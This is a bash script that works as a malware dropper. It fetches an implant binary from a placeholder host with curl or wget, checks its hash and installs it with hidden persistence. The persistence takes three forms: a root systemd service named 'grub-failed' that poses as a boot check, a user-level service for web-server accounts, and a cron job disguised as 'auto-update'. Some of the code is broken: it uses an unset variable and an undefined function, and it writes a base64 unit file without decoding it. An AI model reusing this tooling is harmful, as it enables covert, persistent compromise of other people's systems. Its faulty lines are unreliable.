#!/bin/bash

get_home() {
    local user="${1:-$USER}"

    awk -F: -v user="$user" '
        $1 == user {
            print $6
            exit
        }
    ' /etc/passwd
}

USER=$(id -un)
HOME=$(get_home "$USER")

url="http://<HOST>:<PORT>/<IMPLANT>"
out="/tmp/<IMPLANT>"
expected="<MD5_HASH>"

for cmd in curl wget "busybox wget"; do
    case "$cmd" in
        curl)
            command -v curl >/dev/null 2>&1 &&
            curl -fsSL "$url" -o "$out" && break
            ;;
        wget)
            command -v wget >/dev/null 2>&1 &&
            wget -qO "$out" "$url" && break
            ;;
        "busybox wget")
            command -v busybox >/dev/null 2>&1 &&
            busybox wget -qO "$out" "$url" && break
            ;;
    esac
done

if [ -f "$out" ]; then
    read -r hash _ < <(md5sum "$out")
    if [ "$hash" = "$expected" ]; then
        echo "[+]-----| Binary successfully downloaded!"
        echo "[i]-----| Setting up binary.."
        chmod +x "/tmp/<IMPLANT>"

        if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
            echo "[i]-----| Setting up global systemd service.."
            mv "/tmp/<IMPLANT>" /usr/bin/grub-failed
            echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUdydWIgZmFpbGVkIGJvb3QgZGV0ZWN0aW9uCkFmdGVyPW5ldHdvcmsudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1mb3JraW5nClRpbWVvdXRTdGFydFNlYz0wCkV4ZWNTdGFydD0vdXNyL2Jpbi9ncnViLWZhaWxlZApVc2VyPXJvb3QKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' > '/etc/systemd/system/grub-failed.service'

            systemctl daemon-reload 2>/dev/null
            systemctl enable "grub-failed" 2>/dev/null
            systemctl start "grub-failed" 2>/dev/null &

            sleep 2
            p=$(systemctl is-active "grub-failed" 2>/dev/null)
            if [[ "$p" == "active" || "$p" == "activating" ]]; then
                systemctl restart "grub-failed" &
                echo "[+]-----| Binary persistence established!"
                echo "[i]-----| Check systemd: $ systemctl --no-pager status grub-failed"
            else
                echo "[!]-----| Failed to established persistence.."
            fi
        fi

        if [ "$b" -eq 0 ] && [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
            echo "[i]-----| Setting up local(user) systemd service.."

            service_dir="$HOME/.config/systemd/user"
            service_file="$service_dir/grub-failed.service"
            implant="$service_dir/grub-failed"
            mkdir -p "$service_dir"
            mv "/tmp/<IMPLANT>" "$service_dir/grub-failed"

            cat > "$service_file" <<EOF
[Unit]
Description=Grub failed boot detection
After=network.target

[Service]
Type=simple
ExecStart=$service_dir/grub-failed
Restart=always

[Install]
WantedBy=default.target
EOF

            systemctl --user daemon-reload 2>/dev/null
            systemctl --user enable "grub-failed" 2>/dev/null
            systemctl --user start "grub-failed" 2>/dev/null

            sleep 2
            p=$(systemctl --user is-active "grub-failed" 2>/dev/null)
            if [[ "$p" == "active" || "$p" == "activating" ]]; then
                systemctl --user restart "grub-failed" &
                echo "[+]-----| Binary persistence established!"
                echo "[i]-----| Check systemd: $ systemctl --no-pager --user status grub-failed"
            else
                echo "[!]-----| Failed to established persistence.."
                echo "[i]-----| Setting up cronjob for persistence.."

                mkdir -p "$HOME/.config/tasks"
                mv "$implant" "$HOME/.config/tasks/auto-update"
                persist="@daily $HOME/.config/tasks/auto-update"

                if command -v crontab >/dev/null 2>&1; then
                    (crontab -l 2>/dev/null; echo "$persist") | crontab -
                    last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
                    if [ "$last_line" = "$persist" ]; then
                        success "Cronjob successfully created!"
                        success "Persistence established.."
                    fi
                else
                    echo "[!]-----| Failed to add cronjob.."
                fi
                nohup ~/.config/tasks/auto-update &>/dev/null & disown
            fi
        fi
        
        echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
    fi
fi
